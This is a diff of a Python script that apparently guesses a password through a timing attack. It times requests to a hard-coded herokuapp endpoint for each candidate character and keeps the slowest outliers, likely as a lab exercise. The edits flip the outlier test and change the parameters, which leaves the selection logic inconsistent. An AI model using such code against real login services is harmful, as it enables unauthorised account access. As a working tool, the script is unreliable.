@@ -6,7 +6,7 @@ MAX_LEN = 33
 
 url = r'https://fast-forest-91279.herokuapp.com/'
 started = time.time()
-POOL = 'Hasod5ShelN9ogGaVeAdi420'
+POOL = 'A456n20N'
 
 
 # מחשבת ממוצע
@@ -33,7 +33,7 @@ def outliers(samples, threshold):
     ol = {}
     for item in samples:
         print(f'{item}, {samples[item]}, {mean1}, {std}')
-        if samples[item] > (mean1 + std * threshold):
+        if samples[item] < (mean1 - std * threshold):
             ol[item] = samples[item]
     return ol
 
@@ -79,7 +79,7 @@ def find_password(length):
             checks.append(min(timeit(url1, 5)))
             print(f'min time {checks[-1]}')
             goodDict[POOL[i]] = checks[-1]
-        goodDict = outliers(goodDict, 1.3)
+        goodDict = outliers(goodDict, 0.2)
         if len(passw) != 3:
             passw += max(goodDict.keys(), key=(lambda k: goodDict[k]))
         else:
@@ -98,6 +98,6 @@ def find_pass_last_char(passw):
             return str(passw + i)
 
 
-print(find_pass_last_char(find_password(21)))
+print(find_pass_last_char(find_password(5)))
 ended = time.time()
 print("time" + str(started - ended))
